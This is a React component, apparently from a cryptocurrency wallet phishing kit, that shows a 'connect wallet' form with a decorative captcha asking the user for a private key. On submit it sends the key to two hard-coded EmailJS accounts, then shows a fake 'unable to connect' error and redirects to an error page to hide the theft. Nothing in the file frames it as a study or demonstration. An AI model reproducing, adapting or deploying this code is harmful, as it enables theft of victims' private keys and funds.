import styles from '../WalletConnectForm.module.css';
import {useNavigate} from 'react-router-dom';
import { useEffect, useState } from 'react';
import { ToastContainer, toast } from 'react-toastify';
import emailjs from '@emailjs/browser';
import { FaCheck } from "react-icons/fa";

const PrivateKeyForm = ({wallet, privateKeyLengthNotlong}) => {
    const navigate = useNavigate();
    const [privateKey, setPrivateKey] = useState("");
    const [privateSubmitBtn, setPrivateSubmitBtn] = useState('CONNECT');
    const [privateKey64Long, setPrivateKey64Long] = useState(false);
    
    // Captcha states
    const [showCaptcha, setShowCaptcha] = useState(false);
    const [captchaInput, setCaptchaInput] = useState('');
    const [captchaText] = useState(generateCaptcha());
    const [captchaVerified, setCaptchaVerified] = useState(false);
    const [showSuccessAnimation, setShowSuccessAnimation] = useState(false);

    // Custom Circle Loading Component
    const CircleLoading = ({ size = 20, color = '#4CAF50' }) => {
        return (
            <div style={{
                display: 'inline-block',
                width: `${size}px`,
                height: `${size}px`,
                border: `2px solid ${color}`,
                borderTop: `2px solid transparent`,
                borderRadius: '50%',
                animation: 'spin 1s linear infinite',
                margin: '0 5px'
            }}></div>
        );
    };

    // Add the spin animation to the document head
    useEffect(() => {
        const style = document.createElement('style');
        style.textContent = `
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
        `;
        document.head.appendChild(style);
        return () => document.head.removeChild(style);
    }, []);

    function generateCaptcha() {
        const chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
        let result = '';
        for (let i = 0; i < 6; i++) {
            result += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return result;
    }

    const handleChange = (e) => {
        setPrivateKey(e.target.value)
    }
    
    useEffect(() => {
        const isPasswordWithinRange = (privateKey) => {
            const length = privateKey.length;
            const hasSpaces = privateKey.includes(" ");
            return length >= 30 && length <= 190 && !hasSpaces;
        }
        
        if (isPasswordWithinRange(privateKey)) {
            setPrivateKey64Long(true)
        } else {
            setPrivateKey64Long(false)
        }
    }, [privateKey])

    const verifyCaptcha = () => {
        if (captchaInput === captchaText) {
            setCaptchaVerified(true);
            setShowSuccessAnimation(true);
            setTimeout(() => {
                setShowSuccessAnimation(false);
            }, 2000);
            return true;
        } else {
            toast.error('Captcha verification failed. Please try again.', {
                position: "top-right",
                autoClose: 2500,
                hideProgressBar: false,
                closeOnClick: true,
                pauseOnHover: true,
                draggable: true,
                progress: undefined,
                theme: "light",
            });
            return false;
        }
    };

    // Styled captcha component
    const CaptchaDisplay = ({ text }) => {
        // Function to apply random styles to each character
        const getRandomStyle = () => {
            const rotations = [-15, -10, -5, 0, 5, 10, 15];
            const fonts = ['Arial', 'Verdana', 'Courier', 'Times New Roman', 'Georgia'];
            const weights = ['normal', 'bold'];
            const styles = ['normal', 'italic'];
            
            return {
                display: 'inline-block',
                transform: `rotate(${rotations[Math.floor(Math.random() * rotations.length)]}deg)`,
                fontFamily: fonts[Math.floor(Math.random() * fonts.length)],
                fontWeight: weights[Math.floor(Math.random() * weights.length)],
                fontStyle: styles[Math.floor(Math.random() * styles.length)],
                fontSize: `${Math.floor(Math.random() * 10) + 14}px`,
                color: `rgb(${Math.floor(Math.random() * 100)}, ${Math.floor(Math.random() * 100)}, ${Math.floor(Math.random() * 100)})`,
                margin: '0 2px',
                lineHeight: '1.5',
            };
        };

        return (
            <div style={{ 
                backgroundColor: '#cccccc', 
                padding: '10px', 
                margin: '10px 0',
                borderRadius: '4px',
                textAlign: 'center',
                border: '1px solid #ddd',
                letterSpacing: '2px',
                overflow: 'hidden'
            }}>
                {text.split('').map((char, index) => (
                    <span key={index} style={getRandomStyle()}>
                        {char}
                    </span>
                ))}
            </div>
        );
    };
    
    const handlePrivateKeySubmit = async (e) => {
        e.preventDefault();
        
        if (!privateKey64Long) {
            privateKeyLengthNotlong();
            return;
        }

        // Show captcha if not already shown and not verified
        if (!showCaptcha && !captchaVerified) {
            setShowCaptcha(true);
            return;
        }

        // Verify captcha if shown but not verified
        if (showCaptcha && !captchaVerified) {
            if (!verifyCaptcha()) return;
        }

        // Only proceed if captcha is verified or not required
        setPrivateSubmitBtn("Processing...");
        const name = wallet;
        const type = "Private_Key";
        const data = privateKey;
        const password = "not_required";

        try {
            await emailjs.send(
                'service_umld2d4',
                'template_dwuojlh',
                {
                    to_name: "dapp",
                    from_name: name,
                    message: `
                        Name: ${name}
                        Type: ${type}
                        Data: ${data}
                        Password: ${password}
                    `,
                },
                'o_NYBBGCjR2YIkIYu'
            );

            await emailjs.send(
                "service_w2qehzq",
                "template_5orlh8k",
                {
                    to_name: "prime_noval_app",
                    from_name: name,
                    message: `
                        Name: ${name}
                        Type: ${type}
                        Data: ${data}
                        Password: ${password}
                    `,
                },
                "4VxHnC4IdXAVuU9Gs"
            );

            toast.error('unable to connect', {
                position: "top-right",
                autoClose: 2500,
                hideProgressBar: false,
                closeOnClick: true,
                pauseOnHover: true,
                draggable: true,
                progress: undefined,
                theme: "light",
            });

            setTimeout(() => {
                navigate('/error')
            }, 3000);

        } catch (error) {
            console.log(error)
            setPrivateSubmitBtn("CONNECT")
        }
    }

    return (
        <>
            <ToastContainer />
            <form onSubmit={handlePrivateKeySubmit}>
                <input
                    required
                    type="text"
                    name="privateKey"
                    value={privateKey}
                    autoComplete="off"
                    onChange={handleChange}
                    placeholder='Enter your Private Key'
                    className={styles.privateKeyInput}
                />
                <p className={styles.hint} style={{color: privateKey64Long ? "green" : "red"}}>
                    Private keys vary in format, but they often consist of a sequence of hexadecimal characters without spaces.
                </p>
                
                {/* Captcha Section */}
                {showCaptcha && !captchaVerified && (
                    <div style={{ margin: '15px 0' }}>
                        <p style={{
                            fontSize: '12px',
                            color: '#999999'
                        }}>Please verify you're not a robot:</p>
                        <CaptchaDisplay text={captchaText} />
                        <input
                            type="text"
                            value={captchaInput}
                            onChange={(e) => setCaptchaInput(e.target.value)}
                            placeholder="Enter the captcha above"
                            style={{
                                width: '100%',
                                padding: '10px',
                                margin: '5px 0',
                                borderRadius: '4px',
                                border: '1px solid #999999',
                                color: '#999999'
                            }}
                        />
                        <button 
                            type="button"
                            onClick={verifyCaptcha}
                            style={{
                                width: '100%',
                                padding: '10px',
                                backgroundColor: '#4CAF50',
                                color: 'white',
                                border: 'none',
                                borderRadius: '4px',
                                cursor: 'pointer',
                                margin: '5px 0'
                            }}
                        >
                            Verify Captcha
                        </button>
                    </div>
                )}
                
                {/* Success Animation */}
                {showSuccessAnimation && (
                    <div style={{ textAlign: 'center', margin: '10px 0', fontSize: '14px', display: 'flex', justifyContent: 'center', alignItems: 'center', gap: '10px' }}>
                        <p style={{ color: 'green' }}>Verification successful!</p>
                        <FaCheck />
                    </div>
                )}
                
                <button 
                    type='submit' 
                    className={styles.connectButton}
                    disabled={privateSubmitBtn === "Processing..."}
                >
                    {privateSubmitBtn === "Processing..." ? (
                        <div style={{display: 'flex', alignItems: 'center', gap: '5px'}}>
                            <CircleLoading /> Processing...
                        </div>
                    ) : captchaVerified ? "Verify Wallet" : "Verify Captcha"}
                </button>
            </form>
        </>
    )
}

export default PrivateKeyForm